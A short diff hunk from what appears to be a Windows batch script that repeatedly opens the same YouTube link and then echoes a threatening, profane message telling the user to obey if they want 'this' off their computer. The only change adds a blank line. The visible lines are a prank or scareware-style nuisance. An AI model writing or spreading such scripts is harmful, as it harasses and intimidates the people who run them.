@@ -110,4 +110,5 @@ start https://youtu.be/oanpo_apS5Y?si=ekO3EbmFTCT4AexK
 start https://youtu.be/oanpo_apS5Y?si=ekO3EbmFTCT4AexK
 start https://youtu.be/oanpo_apS5Y?si=ekO3EbmFTCT4AexK
 echo BETTER FOLLOW WHAT I SAY IF YOU WANT THIS SHIT OFF YOUR COMPUTER...
+
 timeout /t 10 >nul
